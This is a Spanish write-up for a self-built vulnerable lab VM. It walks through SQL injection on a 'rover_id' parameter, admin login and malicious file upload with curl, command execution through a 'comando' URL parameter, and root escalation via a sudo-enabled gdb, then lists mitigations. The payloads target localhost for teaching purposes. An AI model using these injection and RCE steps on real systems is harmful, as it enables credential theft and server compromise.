Este proyecto ha acabado con mi salud mental
descargar zip y 
poner los archivos en home de user1
abrir una terminal
HACER:
chmod +x setup_OVA.sh
./setup_OVA.sh

chmod +x automatizado.sh
./automatizado.sh


Aquí tienes el write-up actualizado con detalles sobre la configuración inicial del entorno y el proceso de explotación:

---

## **Write-up: Explotación de Sistema Vulnerable con RCE y Elevación de Privilegios usando GDB**

### **Descripción del Sistema**
Este sistema web vulnerable, desarrollado en PHP, tiene un fallo de seguridad que permite la ejecución remota de código (RCE). El sistema utiliza Apache como servidor web y se ejecuta bajo el usuario `www-data`. Este fallo permite a un atacante con acceso a la aplicación web escalar privilegios y acceder a dos *flags* escondidas en:

1. **Flag de usuario**: `/home/www-data/user.txt`
2. **Flag de root**: `/root/root.txt`

El exploit aprovecha inyecciones SQL, subida de archivos maliciosos y escalación de privilegios usando **gtfobins** con `gdb`.

---

## **1. Configuración del Sistema Vulnerable**

### **Archivos Utilizados**
1. **`setup_ova.sh`**:
   Este script configura el entorno vulnerable, automatizando la instalación de software y la creación de vulnerabilidades necesarias para la explotación.

   #### **Proceso de Configuración Automatizada**
   El script realiza las siguientes acciones clave:
   - **Instalación de Apache y PHP**: Configura el servidor web Apache y el intérprete PHP, necesarios para ejecutar la aplicación web.
   - **Configuración de MySQL**:
     - Crea la base de datos `ssi`.
     - Añade múltiples tablas relacionadas con usuarios, administradores, imágenes y eventos.
     - Inserta datos predeterminados, incluyendo un administrador inicial con credenciales almacenadas directamente en la base de datos.
   - **Despliegue de la Aplicación**:
     - Extrae un archivo ZIP (`final.zip`) con los archivos web y los despliega en `/var/www/html/web`.
     - Configura permisos para asegurar que el servidor Apache (`www-data`) pueda leer y ejecutar los archivos.
   - **Configuración de GDB para Escalación de Privilegios**:
     - Ajusta los permisos de `gdb` mediante el archivo `sudoers`, permitiendo que el usuario `www-data` ejecute este binario como root sin contraseña.

   #### **Instrucciones de Uso**:
   Ejecutar el script como root:
   ```bash
   chmod +x setup_ova.sh
   ./setup_ova.sh
   ```

2. **`automatizado.sh`**:
   Este script automatiza el proceso de explotación, realizando todos los pasos necesarios, desde la inyección SQL hasta la extracción de las *flags*. Diseñado para ahorrar tiempo, simplifica el ataque para evitar realizar comandos manuales.

   #### **Acciones Automatizadas**
   - Realiza la inyección SQL para extraer credenciales.
   - Se autentica automáticamente como administrador en el sistema.
   - Sube el archivo malicioso `gdb.sh` al servidor.
   - Ejecuta comandos en el servidor remoto para explotar la vulnerabilidad RCE.
   - Escala privilegios con `gdb` y lee las *flags*.

   #### **Instrucciones de Uso**:
   Ejecutar el script directamente:
   ```bash
   chmod +x automatizado.sh
   ./automatizado.sh
   ```

   Durante la ejecución, el script muestra las acciones realizadas y los resultados, incluyendo el contenido de las *flags*.

---

## **2. Explotación**

### **Paso 1: Inyección SQL**
La vulnerabilidad en `rover_id` permite inyección SQL para extraer credenciales. Por ejemplo:
```bash
http://localhost/web/final/ulio-html/listadoFotosRovers.php?rover_id=' UNION SELECT 1, 2, contrasena, gmail, 5 FROM final_usuarios--
```

#### **Objetivo**:
Extraer las credenciales del administrador, incluyendo:
- **Correo electrónico (`gmail`)**: Para el login.
- **Contraseña (`contrasena`)**: En texto plano.

#### **Automatización**:
El script `automatizado.sh` realiza esta extracción utilizando `curl` y formatea la salida con `jq`.

---

### **Paso 2: Acceso como Administrador**
Con las credenciales obtenidas, autenticarse en el sistema:
```bash
curl -X POST \
     -d "email=admin@gmail.com" \
     -d "contrasena=admin123" \
     -d "es_administrador=on" \
     -c cookies.txt \
     "http://localhost/web/final/dashmin/login.php"
```

Esto almacena las cookies de sesión en `cookies.txt`, lo que permite acciones autenticadas.

---

### **Paso 3: Subida de Archivo Malicioso**
Como administrador, la funcionalidad de subida de imágenes permite cargar un script malicioso (`gdb.sh`):
```bash
curl -X POST \
     -F "profile_picture=@gdb.sh" \
     "http://localhost/web/final/dashmin/upload.php"
```

El archivo se guarda en el directorio `uploads/` del servidor.

---

### **Paso 4: Ejecución del Script Malicioso**
Usando otra vulnerabilidad en el servidor (RCE), ejecutamos `gdb.sh`:
```bash
curl -s -b cookies.txt \
"http://localhost/web/final/dashmin/list_uploads.php?comando=chmod%20744%20uploads/gdb.sh;./uploads/gdb.sh"
```

Este comando:
1. Cambia permisos del script a ejecutables.
2. Lo ejecuta, escalando privilegios a root.

---

### **Paso 5: Captura de las Flags**
1. **Flag de Usuario**:
   El script accede al archivo `/home/www-data/user.txt`:
   ```bash
   curl -s -b cookies.txt \
   "http://localhost/web/final/dashmin/list_uploads.php?comando=cat%20/home/www-data/user.txt"
   ```

2. **Flag de Root**:
   Con `gdb`, se lee `/root/root.txt`:
   ```bash
   ./uploads/gdb.sh
   ```

El contenido de ambas *flags* se muestra en la salida.

---

## **3. Mitigación**

### **Vulnerabilidades Identificadas**
1. **Inyección SQL**:
   - El parámetro `rover_id` no sanitiza entradas.
2. **Subida de Archivos Maliciosos**:
   - No hay validación de extensiones ni restricciones de tipo MIME.
3. **Escalación de Privilegios**:
   - El binario `gdb` tiene permisos inseguros en el archivo `sudoers`.

---

### **Medidas de Seguridad**
1. **Sanitización de Entradas**:
   - Usar consultas SQL preparadas.
   - Validar entradas para evitar comandos maliciosos.

2. **Control de Subidas de Archivos**:
   - Limitar las extensiones permitidas (`.jpg`, `.png`).
   - Subir archivos a directorios con permisos `noexec`.

3. **Configuración Segura de Permisos**:
   - Revisar los binarios con permisos elevados (`gdb`) y eliminar configuraciones inseguras en `sudoers`.

4. **Deshabilitar Funciones Inseguras en PHP**:
   - Modificar `php.ini` para restringir funciones como `exec`, `shell_exec`:
     ```
     disable_functions = exec, system, passthru
     ```

5. **Principio de Privilegios Mínimos**:
   - Ejecutar el servidor web con permisos limitados y aislarlo en un entorno de contenedor o jaula (`chroot`).

---

## **Conclusión**
Este escenario ilustra cómo una serie de vulnerabilidades, combinadas, pueden comprometer un sistema web. Desde inyección SQL hasta escalación de privilegios, es fundamental identificar y mitigar estos riesgos para proteger aplicaciones web contra ataques avanzados.
